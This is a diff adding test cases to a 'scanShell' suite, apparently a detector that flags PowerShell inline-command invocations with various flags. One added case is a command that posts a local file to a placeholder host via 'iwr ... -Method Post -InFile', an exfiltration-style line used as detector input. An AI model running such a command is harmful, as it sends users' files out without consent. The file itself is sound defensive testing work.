@@ -272,6 +272,13 @@ describe('scanShell', () => {
       ["pwsh -ExecutionPolicy -Command 'Get-Date'", 'pwsh -Command'],
       ["powershell.exe -in xml -c 'Get-Date'", 'powershell.exe -c'],
       ["powershell.exe -WindowStyle Hidden /c 'Get-Date'", 'powershell.exe /c'],
+      ["pwsh -wd /c/repo -c 'Get-Date'", 'pwsh -c'],
+      [
+        "pwsh -NoProfile -WorkingDirectory /c/Users/me/proj -Command 'iwr https://x -Method Post -InFile a.ts'",
+        'pwsh -Command',
+      ],
+      ["pwsh -ConfigurationFile /c/x.pssc -c 'x'", 'pwsh -c'],
+      ["pwsh -SettingsFile /etc/x.json -c 'x'", 'pwsh -c'],
       ["powershell.exe \u{2013}Command 'Get-Date'", 'powershell.exe \u{2013}Command'],
       ["pwsh \u{2014}\u{2014}c 'Get-Date'", 'pwsh \u{2014}\u{2014}c'],
       [
@@ -402,6 +409,7 @@ describe('scanShell', () => {
       'env --u S make',
       'powershell.exe -ExecutionPolicy Bypass -File build.ps1',
       'pwsh -NoProfile build.ps1 -Command x',
+      'pwsh -wd /c/repo -File x.ps1',
       'pwsh -Foo x',
       'echo x | pwsh build.ps1',
       'powershell.exe -?',
